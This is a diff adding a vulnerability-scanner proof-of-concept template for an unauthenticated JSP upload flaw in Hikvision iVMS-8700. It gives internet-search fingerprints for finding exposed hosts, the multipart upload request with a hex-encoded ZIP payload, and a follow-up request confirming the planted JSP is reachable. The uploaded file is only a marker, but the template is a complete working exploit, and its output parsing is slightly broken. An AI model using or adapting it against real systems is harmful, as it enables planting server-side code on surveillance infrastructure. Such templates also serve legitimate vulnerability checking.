@@ -1,0 +1,65 @@
+name: haikang-ivms-8700-getPic-upload
+detail:
+  author: 
+  links:
+    - 
+  vulnerability:
+    level: critical
+    fofa-query: icon_hash="-911494769"
+    hunter-query: web.icon=="3670cbb1369332b296ce44a94b7dd685"
+    quake-query: favicon:"3670cbb1369332b296ce44a94b7dd685"
+    zoomeye-query: 
+    threatbook-query: 
+    cve: 
+    tips: d:/Program Files (x86)/SurveillanceSystem/CMS/webserver/Tomcat/webapps/msp/upload/ios/  都在这个目录下  /4ndex/4ndex/4ndex.jsp
+
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    s3: randomLowercase(8)
+    rboundary: randomInt(800000000, 1000000000)
+    reverse: newReverse()  # 结果表达式写 reverse.wait(5)
+    reverseURL: reverse.url # http://xxx
+    reverseRMI: reverse.rmi # rmi://xx 
+    requestURL: request.url # 目标url http://xx
+    t1: timeConvert(now(), '2006-01-02')
+    t2: timeConvert(now(), '2006-01')
+    b1: base64Decode("")
+    h1: hexDecode("504b03040a0000000000d88bb75800000000000000000000000006001c00346e6465782f5554090003c80c4f66d10c4f6675780b000104000000000400000000504b03040a0000000000db8bb7584b5e40f506000000060000000f001c00346e6465782f346e6465782e6a73705554090003ce0c4f66d10c4f6675780b000104000000000400000000346e6465780a504b03040a0000000000cc8bb75800000000000000000000000013001c00346e6465782f50657472656c48442e6170702f5554090003af0c4f66e20c4f6675780b000104000000000400000000504b01021e030a0000000000d88bb758000000000000000000000000060018000000000000001000ed4100000000346e6465782f5554050003c80c4f6675780b000104000000000400000000504b01021e030a0000000000db8bb7584b5e40f506000000060000000f0018000000000001000000a48140000000346e6465782f346e6465782e6a73705554050003ce0c4f6675780b000104000000000400000000504b01021e030a0000000000cc8bb758000000000000000000000000130018000000000000001000ed418f000000346e6465782f50657472656c48442e6170702f5554050003af0c4f6675780b000104000000000400000000504b05060000000003000300fa000000dc0000000000")
+    # m5: md5(string(requestURL))) m5 不调用的话，就会报错运行不起来
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /msp/home/upload.action;getPic?type=ios
+      follow_redirects: false
+      headers:
+        User-Agent: MicroMessenger
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Content-Type: multipart/form-data; boundary=edR4mICIkGlJHVa2BvKV
+      body: "--edR4mICIkGlJHVa2BvKV\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\nios\r\n--edR4mICIkGlJHVa2BvKV\r\nContent-Disposition: form-data; name=\"file\"; filename=\"4ndex.ipa\"\r\nContent-Type: None\r\n\r\n{{h1}}\r\n\r\n--edR4mICIkGlJHVa2BvKV--"
+      
+    expression: response.status == 200 && (response.body_string.contains("success") || response.body.bcontains(bytes("success"))) && response.body_string.contains("data")
+
+    output:
+      search: |-
+        "(?P<rfile>\\w+.jsp)".bsubmatch(response.body)
+      rfile: search["rfile"]
+      search1: |-
+        '"date\":\"(?P<date>.+?)\",\"macaddr".bsubmatch(response.body)'
+      rdir: search["rdir"]
+
+  r1:
+    request:
+      method: GET
+      path: /msp/upload/ios/4ndex/4ndex/4ndex.jsp
+      follow_redirects: false
+      headers:
+      body: 
+
+    expression: response.status == 200 && (response.body_string.contains("4ndex") || response.body.bcontains(bytes("4ndex")))
+    
+expression: r0() && r1()
